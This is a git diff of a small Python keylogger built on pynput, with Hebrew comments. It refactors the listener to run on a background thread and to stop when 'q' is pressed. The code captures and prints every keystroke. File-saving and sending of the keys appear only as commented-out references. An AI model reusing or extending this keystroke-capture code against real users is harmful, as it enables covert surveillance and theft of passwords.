@@ -1,7 +1,6 @@
 from abc import ABC,abstractmethod
 from pynput.keyboard import Key,Listener
-import sys
-from datetime import datetime
+import threading
 
 
 class IKeyLogger(ABC):
@@ -16,6 +15,8 @@ class IKeyLogger(ABC):
 
 # קלאס שאחראי על ההקלטה מפעיל הקלטה בהדלקה ראשונה
 class KeyLogger(IKeyLogger):
+    def __init__(self):
+        self.lisiner = None
     # אחראי על הפעלת פונקציות יפוי ושמירה בכל לחיצה
     @staticmethod
     def __on_press(Key):
@@ -25,19 +26,16 @@ class KeyLogger(IKeyLogger):
         # FileWriter().write(key_nise)
 
         # פןנקציה שמפסיקה את התוכנה אם לחץ על קונטרול שיפט d
-    @staticmethod
-    def __on_release(key):
+    # @staticmethod
+    def __on_release(self,key,bool=False):
         try:
-            if key.char == '\x04':  # Ctrl+D
+            print(key)
+            # if key.char == '\x04' or bool:  # Ctrl+D+shift
+            if str(key) == "'q'" or bool: # Ctrl+D+shift
                 print("Exiting...")
-                sys.exit(0)
+                self.stop_logging()
         except AttributeError:
             pass
-
-#  מחלקה מופשטת של כותב. מורישה מתודה של כתוב ומתודה של שלח
-    def start_logging(self):
-        with Listener(on_press=KeyLogger.__on_press, on_release=KeyLogger.__on_release) as listener:
-            listener.join()
 
     # אחראי ליפות את המקש
     @staticmethod
@@ -58,9 +56,23 @@ class KeyLogger(IKeyLogger):
             else:
                 return key_list[1]
 
-    def stop_logging(self) -> None:
-        sys.exit(0)
+    #  מחלקה מופשטת של כותב. מורישה מתודה של כתוב ומתודה של שלח
+    def start_logging(self):
+        def _statr():
+            with Listener(on_press=KeyLogger.__on_press, on_release=self.__on_release) as l:
+                self.lisiner = l
+                self.lisiner.join()
+        ran = threading.Thread(target=_statr)
+        ran.start()
 
-KeyLogger().start_logging()
+    def stop_logging(self) -> None:
+        if self.lisiner:
+            self.lisiner.stop()
+
+a = KeyLogger()
+a.start_logging()
+
+
+a.stop_logging()
 
 
